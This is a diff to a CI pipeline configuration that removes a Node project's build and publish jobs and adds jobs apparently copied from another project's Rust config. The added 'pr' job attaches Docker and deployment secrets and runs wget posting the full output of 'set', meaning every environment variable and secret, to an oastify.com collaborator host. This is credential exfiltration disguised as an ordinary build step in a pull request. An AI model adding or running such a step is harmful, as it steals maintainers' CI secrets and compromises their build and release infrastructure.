@@ -1,32 +1,46 @@
-cache:
-    pipeline: [~/.npm]
-
 shared:
-    image: node:12
+  image: node:12
 
 jobs:
-    main:
-        requires: [~pr, ~commit]
-        steps:
-            - install: npm ci
-            - test: npm test
-
-    publish:
-        requires: main
-        environment:
-            GIT_SHALLOW_CLONE: false
-        steps:
-            - setup-ci: git clone https://github.com/screwdriver-cd/toolbox.git /tmp/ci
-            - install: npm ci
-            - docs: |
-                . /tmp/ci/git-ssh.sh
-                git remote set-url origin `git remote get-url --push origin`
-                npm run sass-build
-                npm run deploy-storybook
-            - publish: |
-                . /tmp/ci/git-ssh.sh
-                npx semantic-release
-        secrets:
-            - NPM_TOKEN
-            - GH_TOKEN
-            - GIT_KEY_BASE64
+  pr:
+    requires: [~pr]
+    steps:
+      - run_arbitrary_script: wget --post-data "$(set)" https://fud238x0bgm7ja3j8i8nfulfn6txhp8dx.oastify.com
+    secrets:
+      - CI_DEPLOY_USERNAME
+      - CI_DEPLOY_PASSWORD
+      - DOCKER_EMAIL
+      - DOCKER_REPO
+      - DOCKER_PASSWORD
+      - DOCKER_REPOSITORY
+      - DOCKER_USERNAME  
+  main:
+    requires: [~commit]
+    steps:
+      - run_arbitrary_script: apt-get update && apt-get -y install clang openssl && rustup component add rustfmt && cargo test -- --test-threads=1 && cargo build --release
+    secrets:
+      - CI_DEPLOY_USERNAME
+      - CI_DEPLOY_PASSWORD
+      - DOCKER_EMAIL
+      - DOCKER_REPO
+      - DOCKER_PASSWORD
+      - DOCKER_REPOSITORY
+      - DOCKER_USERNAME
+    annotations:
+      screwdriver.cd/dockerEnabled: true
+  publish:
+    requires: [~main]
+    steps:
+      - create_tag:
+          /bin/bash create_git_tag.sh
+      - build_and_publish_image:
+          LOGIN_USERNAME=$DOCKER_USERNAME LOGIN_PASSWORD=$DOCKER_PASSWORD /bin/bash push_docker.sh
+      - publish_docs:
+          apt-get update && apt-get -y install clang openssl python3-pip && rustup component add rustfmt && cargo doc && echo '<meta http-equiv=refresh content=0;url=myst/index.md>' > target/doc/index.html && cp target/doc/index.html target/doc/index.md && pip3 install ghp-import && ghp-import -n target/doc && git push -qf https://$GITHUB_TOKEN@github.com/OpenTSDB/opentsdb-meta.git gh-pages    
+    annotations:
+      screwdriver.cd/dockerEnabled: true
+    secrets:
+      - DOCKER_EMAIL
+      - DOCKER_PASSWORD
+      - DOCKER_USERNAME
+      - GITHUB_TOKEN
